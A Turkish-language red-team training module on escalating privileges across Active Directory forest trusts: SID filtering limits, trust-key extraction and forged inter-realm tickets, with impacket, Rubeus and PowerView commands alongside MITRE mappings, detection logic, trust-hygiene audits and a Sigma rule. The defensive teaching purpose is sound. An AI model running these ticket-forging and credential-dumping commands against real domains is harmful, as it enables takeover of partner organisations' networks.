## 1. Kavramsal Temel — Neden Var?

[Intra-forest yükseltme](./10.1_SID_History_Injection.md) kolaydı çünkü **forest bir güven sınırıdır** ve içinde SID filtering yoktur. **Cross-forest** (iki ayrı forest arası trust) farklıdır: forest'lar arası güven, bilinçli olarak **SID filtering** ile korunur — bir forest'tan gelen token'daki "yabancı" ayrıcalıklı SID'ler (519 gibi) sınırda **süzülür**. Yani `ExtraSIDs` numarası cross-forest'ta çalışmaz. Bu modül, forest sınırını aşmanın SID filtering'e takılmayan yollarını inceler.

**Analoji:** Intra-forest, aynı ülkenin şehirleri arası seyahattir — kimlik her yerde geçer. Cross-forest ise **uluslararası sınırdır**: pasaport kontrolü (SID filtering) var. Yine de sınırı aşmanın yolları vardır: (a) sınırda **hâlâ geçerli sayılan** belirli izinler (TGT delegation, foreign group membership); (b) sınır memurunun **gevşek yapılandırması** (SID filtering devre dışı bırakılmış trust'lar).

**Neden önemli:** Kurumsal birleşme/satın almalarda forest trust'lar yaygındır ve çoğu zaman **yanlış yapılandırılır** (SID filtering kapalı, `TREAT_AS_EXTERNAL` bayrağı). Bir forest'ı ele geçiren saldırgan, güvenilen diğer forest'a sıçrayabilirse iki organizasyonu birden düşürür. Trust yönü ve türü ([enumerasyon](../Modul_01_Kesif_ve_Numaralandirma/01.4_Trust_ve_Forest_Enumerasyonu.md)) saldırı yüzeyini belirler.

## 2. Teknik Derinlik — Trust Türleri, SID Filtering ve Trust Key

**Trust nitelikleri (`trustAttributes`):**
| Bayrak | Anlam | Saldırı etkisi |
|---|---|---|
| `WITHIN_FOREST` (0x20) | Aynı forest | SID filtering YOK → [10.1](./10.1_SID_History_Injection.md) |
| `FOREST_TRANSITIVE` (0x8) | Forest trust | SID filtering VAR (varsayılan) |
| `TREAT_AS_EXTERNAL` (0x40) | Dış muamele | SID filtering **gevşer** → ExtraSIDs geçebilir |
| `QUARANTINED_DOMAIN` (0x4) | SID filtering zorlanır | Saldırıyı kapatır |

**Inter-realm TGT (trust key):** İki domain arası trust kurulduğunda, ortak bir **trust key** paylaşılır ve dizinde bir **trust account** (`OTHERDOMAIN$`) olarak saklanır. Bir kullanıcı diğer domain'in kaynağına eriştiğinde, kendi DC'si bir **inter-realm TGT** üretir (trust key ile şifreli), hedef domain DC'si bunu çözer. Saldırgan **trust key'i** ([DCSync](../Modul_09_Domain_Hakimiyeti_ve_Kalicilik/09.1_DCSync_ile_Hash_Cikarma.md) ile `OTHERDOMAIN$` hesabından) alırsa, **inter-realm TGT'yi kendisi imzalayabilir** — forest'lar arası "trust ticket".

```
 FOREST A (ele geçirildi)                    FOREST B (hedef)
   DCSync ──▶ trust key (B$ hesabı)             │
        │                                        │
        ▼                                        ▼
   forged inter-realm TGT (trust key imzalı) ──▶ B DC kabul eder
        │                                        │
   SID filtering ExtraSIDs=519'u SÜZER  ◀────────┘  (ama filtering açıksa!)
        │
   ancak filtering yalnızca ayrıcalıklı RID'leri süzer → RID>1000 SID'ler geçebilir
```

**SID filtering'in sınırı:** Filtering **yalnızca** forest'a özgü ayrıcalıklı SID'leri (RID < 1000, ör. 519) süzer. **RID ≥ 1000** olan grup SID'leri (hedef forest'ta oluşturulmuş özel ayrıcalıklı gruplar) süzülmez! Eğer hedef forest'ta yüksek yetkili bir custom grup (RID>1000) varsa, onun SID'ini ExtraSIDs'e koyarsan filtering'i atlatırsın. Ayrıca **foreign security principals** (FSP) ve trust üzerinden verilmiş açık ACL'ler de meşru sıçrama yollarıdır.

**Filtering kademeleri (`SIDFilteringForestAware` / `SIDFilteringQuarantined`):**
| Yapılandırma | Süzülen | Saldırı sonucu |
|---|---|---|
| Forest trust (varsayılan) | RID < 1000 ayrıcalıklı SID'ler | Yalnız RID≥1000 custom SID geçer |
| `TREAT_AS_EXTERNAL` | Yalnız SID'in *kendi* domain'i dışı | 519 dahil daha çok SID geçebilir |
| `Quarantine` (external trust) | Domain SID'i dışındaki **her şey** | ExtraSIDs tamamen ölür |
| SID filtering **kapalı** (yanlış yapılandırma) | Hiçbiri | 519 ExtraSIDs → tam forest kompromisi |

**Gerçek dünyada neden kapalı olur:** Birleşme/satın alma sonrası göç senaryolarında yöneticiler, eski forest'tan gelen `sIDHistory`'lerin çalışması için SID filtering'i **bilinçli devre dışı bırakır** (`netdom trust /EnableSIDHistory:yes`) ve göç bitince açmayı unuturlar. Bu, cross-forest ExtraSIDs saldırısının en yaygın gerçek-dünya ön koşuludur → [Blue 9.x](../../2-Blue_Team/Modul_09_Tehdit_Avciligi_ve_Degerlendirme/) trust hijyeni denetimiyle avlanır.

**Inter-realm TGT'nin PAC işlenişi:** Kullanıcı forest A'da TGT alır → forest B kaynağına erişmek isteyince A'nın DC'si bir **referral TGT** (inter-realm, trust key ile şifreli) verir → B'nin DC'si bunu trust key ile açar, PAC'teki SID'leri **filtering kurallarına göre** süzer ve B için TGS üretir. Saldırgan trust key'i çaldıysa referral TGT'yi kendisi imzalar; ama B'nin DC'si yine de filtering uygular → bu yüzden RID≥1000 hilesi gerekir.

## 3. Pratik Uygulama — Çok Araçlı

**A) Trust enumerasyonu (yön ve nitelik):**
```powershell
Get-DomainTrust                                    # PowerView — tüm trust'lar
Get-DomainTrust | ? { $_.TrustAttributes -match 'FOREST_TRANSITIVE' }
nxc ldap dc01 -u user -p pass -M enum_trusts       # NetExec
```
```bash
# BloodHound — cross-forest saldırı yolları (Cypher)
# MATCH p=(n)-[:TrustedBy]->(m) RETURN p
```

**B) Trust key çıkarma + forged inter-realm TGT:**
```bash
# Forest A DC'de: trust hesabının hash'i (B$)
impacket-secretsdump 'A.local/da:Pass@dc-a' -just-dc-user 'B.LOCAL$'
# Trust key ile inter-realm TGT üret + hedef custom grup SID (RID>1000)
impacket-ticketer -nthash <trustkey> -domain-sid <A_SID> -domain A.local \
   -extra-sid <B_SID>-<RID>=1105 -spn krbtgt/B.LOCAL Administrator
```

**C) Kerberos-only cross-forest erişim (Rubeus):**
```powershell
# Inter-realm TGT ile hedef forest servisine TGS iste
Rubeus.exe asktgs /ticket:interrealm.kirbi /service:cifs/dc-b.b.local /dc:dc-b.b.local /ptt
```

**D) Foreign group / ACL sömürüsü (meşru sıçrama):**
```powershell
# A forest kullanıcısının B forest'ta hangi gruplara/ACL'lere sahip olduğunu bul
Get-DomainForeignGroupMember -Domain b.local
Find-InterestingDomainAcl -Domain b.local | ? { $_.IdentityReferenceName -match 'A\\' }
```

**E) BloodHound ile cross-forest yol keşfi:**
```bash
# Her iki forest'ı topla, TrustedBy/foreign-membership kenarlarını grafikte gör
azurehound veya SharpHound --domain a.local --collectionmethods All,Trusts
# Cypher: A'dan B'ye ulaşan en kısa yol (foreign ACL/grup üzerinden)
#   MATCH p=shortestPath((a:User {domain:'A.LOCAL'})-[*1..]->(b {domain:'B.LOCAL'})) RETURN p
```

**Gerçek-dünya zinciri:**
```
Forest A hakimiyeti ──▶ trust enum (FOREST_TRANSITIVE + filtering?) 
        │
        ├── filtering KAPALI/TREAT_AS_EXTERNAL ──▶ ExtraSIDs=519 ──▶ B forest admin
        └── filtering AÇIK ──▶ RID>1000 custom grup SID veya foreign ACL ──▶ hedefli erişim ──▶ B DC
```

**Gerçek-dünya notu:** Şirket satın almalarında kurulan forest trust'lar, entegrasyon aceleyle yapıldığından sıklıkla SID filtering'i kapalı bırakır. Bir kırmızı takım, hedef organizasyonun **iş ortağı/iştirak forest'ını** ele geçirip bu güven üzerinden ana forest'a sıçrayabilir — "en zayıf halka" iki organizasyonu birden düşürür.

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Kaynak İz (IOC) | Karşı Blue |
|---|---|---|---|
| Cross-forest forged TGT | **T1134.005 / T1550.003** | Hedef forest'ta olağandışı inter-realm 4769; yabancı SID'ler | [Blue 10.1](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.1_IR_Playbook_Tespitten_Containment.md) |
| Trust key çıkarma | T1003.006 | `OTHERDOMAIN$` hesabı için 4662 (DCSync) | [Blue 10.2](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.2_KRBTGT_Cift_Reset_ve_Ticket_Gecersizlestirme.md) |
| SID filtering bypass | T1484.002 | RID>1000 yabancı SID; TREAT_AS_EXTERNAL trust | [Blue 9.x](../../2-Blue_Team/Modul_09_Tehdit_Avciligi_ve_Degerlendirme/) |

**OPSEC notları:**
- **En net iz:** Hedef forest DC'sinde, güvenilen forest'tan gelen bir asıl'ın token'ında **beklenmedik yüksek yetkili SID** taşıması veya bir trust hesabı için (`B$`) DCSync (4662). Blue tarafı trust hesaplarını Tier-0 gibi izler.
- **SID filtering doğrulaması** saldırının ön koşuludur: `netdom trust /quarantine` veya `Get-ADTrust -Filter *` ile filtering durumu görülür. Filtering açıksa saldırgan RID>1000/foreign ACL yoluna kayar (çok daha kısıtlı, hedefli).
- **Trust yönü tuzağı:** Trust *tek yönlüyse* saldırı yönü kısıtlıdır — "trusting" tarafın kaynaklarına erişilir, "trusted" tarafa değil. Enumerasyon ([Red 01.4](../Modul_01_Kesif_ve_Numaralandirma/01.4_Trust_ve_Forest_Enumerasyonu.md)) bu yönü netleştirir.
- **Kurtarma:** Cross-forest ihlalinde her iki forest'ın da krbtgt + trust key reset'i gerekir; trust'ın yeniden değerlendirilmesi (filtering açma) şarttır.
- **PAM/bastion forest istisnası:** Microsoft'un PAM (Privileged Access Management) trust'ı, bilinçli olarak `TREAT_AS_EXTERNAL` benzeri gevşeklikle ShadowPrincipal SID'lerini geçirir. Bu meşru bir tasarımdır ama yanlış kurulursa saldırı yüzeyi olur — bastion forest ele geçirilirse üretim forest'ına yol açar.
- **Trust hesabı = gizli Tier-0:** `OTHERDOMAIN$` trust hesabının hash'i, forest sınırını aşan bir Golden Ticket'e eşdeğerdir. Blue bu hesapları krbtgt gibi izlemeli; saldırgan ise DCSync'te onu hedeflerken 4662 izi bırakır.

**Tespit mantığı (Blue bakışı):** (1) Trust yapılandırma driftı — `Get-ADTrust` ile SID filtering'i kapalı/`TREAT_AS_EXTERNAL` trust'ları düzenli denetle; (2) hedef forest'ta, güvenilen forest'tan gelen bir principal'ın token'ında **beklenmedik RID≥1000 yüksek yetkili SID**; (3) trust hesabı için DCSync (4662). Bunlar [Blue 9.x trust hijyeni](../../2-Blue_Team/Modul_09_Tehdit_Avciligi_ve_Degerlendirme/) ve [Blue 10.1 IR](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.1_IR_Playbook_Tespitten_Containment.md) kapsamındadır.

## 5. Doğrulama / Lab

```powershell
# Lab: iki forest, aralarında forest trust (filtering test için aç/kapa)
# 1) Forest A'da trust key çıkar, inter-realm TGT üret
# 2) Filtering KAPALI iken 519, AÇIK iken RID>1000 ile B forest erişimini karşılaştır
# Blue doğrulama (trust yapılandırma denetimi):
Get-ADTrust -Filter * | Select Name, Direction, ForestTransitive, SIDFilteringForestAware
```

**Trust hijyeni denetimi (drift avı):**
```powershell
# SID filtering KAPALI / TREAT_AS_EXTERNAL trust'ları bul (saldırı ön koşulu)
Get-ADTrust -Filter * | Where-Object {
    $_.SIDFilteringForestAware -eq $false -or $_.SIDFilteringQuarantined -eq $false
} | Select Name, Direction, TrustAttributes
# netdom ile doğrula:
netdom trust corp.local /domain:partner.local /quarantine   # 'Yes' olmalı
```

**Sigma kuralı (cross-forest — yabancı ayrıcalıklı SID ile erişim):**
```yaml
title: Cross-Forest Access with Foreign Privileged SID
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 4769                       # hedef forest DC'sinde TGS
  foreign_high_priv:                    # güvenilen forest'tan gelip yüksek yetki taşıyan
    TargetDomainName: '%TrustedForest%'
  trust_dcsync:                         # trust hesabı için DCSync
    EventID: 4662
    ObjectName|endswith: '$'
    Properties|contains: '1131f6ad'
  condition: (selection and foreign_high_priv) or trust_dcsync
level: high
```
En etkili önlem tespit değil **yapılandırmadır**: göç sonrası SID filtering'i tekrar açmak saldırının RID<1000 yolunu tamamen kapatır.
